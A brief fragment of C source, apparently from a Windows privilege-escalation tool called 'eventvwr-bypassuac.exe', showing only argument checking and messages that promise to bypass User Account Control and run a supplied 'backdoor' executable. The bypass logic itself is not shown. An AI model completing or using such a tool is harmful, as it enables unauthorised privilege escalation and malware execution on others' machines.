...
int main(int argc, char *argv[]) {
	if( argc == 2 ) {
      printf("Will bypass UAC and execute %s\n", argv[1]);
   }
   else {
      printf("One argument expected.Plase backdoor in the same folder and run eventvwr-bypassuac.exe backdoor.exe\n");
			return 0;
   }
